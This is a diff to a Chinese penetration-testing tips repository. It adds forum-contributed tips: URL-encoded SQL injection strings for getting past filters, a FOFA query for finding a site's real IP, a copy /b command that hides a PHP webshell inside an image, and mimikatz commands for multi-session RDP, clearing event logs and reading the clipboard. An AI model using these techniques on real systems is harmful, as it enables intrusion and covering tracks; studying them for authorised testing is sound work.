@@ -20,7 +20,9 @@
 
 1、本篇首发于Tools论坛，大家可以再Tools论坛该帖子下面留言，我会定时收集整理。
 ```
+由于第一版不知道怎么没有编辑权限了，所以开了第二版，都可以留言，看到就整理出来
 https://www.t00ls.net/thread-59411-1-1.html
+https://www.t00ls.net/thread-59559-1-1.html
 ```
 
 2、关注公众号"洞一CyberSecurity"，进行留言，格式：渗透测试Tips-xxxxxxxx。
@@ -533,6 +535,33 @@ cat file1.txt file2.txt fileN.txt > out.txt
 sort out.txt | uniq > out2.txt
 ```
 
+------------
+### 2021年01月29日 - 更新分界线，整理了来自Tools师傅们留言的渗透测试Tips：
+
+1、注入时使用url编码对&&和||编码可以绕过一些拦截。例如：Author By：jettt
+
+```
+1' and 1=1--+
+1' %26%26 True--+
+同理其他编码也可以试一个遍。
+```
+
+2、信息收集的时候可以使用fofa查看证书看是否是真实IP 语法 cert="baidu.com"。Author By：zhaoze
+
+3、将普通图片1.jpg 和 木马文件shell.php ,合并成木马图片2.jpg：Author By：Lstarx
+
+ ```
+$ copy /b 1,jpg+shell.php 2.jpg
+ ```
+
+4、mimikatz小功能：Author By：Rive丶
+
+ ```
+多用户登录3389：ts::multirdp
+ 清除日志：event::drop
+ 粘贴板信息：misc::clip
+ ```
+
 ---------------------------------------
 
 ### 更新日志
@@ -544,13 +573,13 @@ sort out.txt | uniq > out2.txt
 
 2021年01月28日 - 整理更新了第38~48，所学习到的渗透测试Tips
 
-2021年01月29日 - 整理更新了第49~59，所学习到的渗透测试Tips
+2021年01月29日 - 整理更新了第49~59，所学习到的渗透测试Tips，以及来自Tools师傅们部分Tips
 
 # 贡献个人（排名不分先）
 
 **感谢以下师傅们对本仓库，以及安全这个小圈子做的一些小贡献，开源精神永不眠！**
 
-六六，Jokong，phage，登登登Y，zhaoze，oops33，ptgeft，Alex125，Scorpion，iwtbhero，ffffffff0x
+六六，Jokong，phage，登登登Y，zhaoze，oops33，ptgeft，Alex125，Scorpion，iwtbhero，ffffffff0x，Lstarx，jettt，Rive丶
 
 # 贡献团队（根据贡献个数进行排名）
 
